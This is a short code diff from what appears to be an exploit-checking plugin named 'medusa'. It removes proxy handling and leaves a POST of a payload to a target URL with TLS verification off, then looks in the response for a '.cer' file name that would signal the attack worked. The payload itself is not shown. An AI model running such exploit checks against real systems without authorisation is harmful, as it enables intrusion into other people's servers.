@@ -90,14 +90,14 @@ def medusa(Url,RandomAgent,ProxyIp):
         }
 
         s = requests.session()
-        if ProxyIp!=None:
-            proxies = {
-                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
-                "http": "http://" + str(ProxyIp)
-            }
-            resp = s.post(payload_url,data=data,headers=headers, timeout=6, proxies=proxies,verify=False)
-        elif ProxyIp==None:
-            resp = s.post(payload_url,data=data,headers=headers, timeout=6, verify=False)
+        # if ProxyIp!=None:
+        #     proxies = {
+        #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
+        #         "http": "http://" + str(ProxyIp)
+        #     }
+        #     resp = s.post(payload_url,data=data,headers=headers, timeout=6, proxies=proxies,verify=False)
+        # elif ProxyIp==None:
+        resp = s.post(payload_url,data=data,headers=headers, timeout=6, verify=False)
         con = resp.text
         match = re.search(r'getimg\(\'([\d]+.cer)\'\)', con)
         if match:
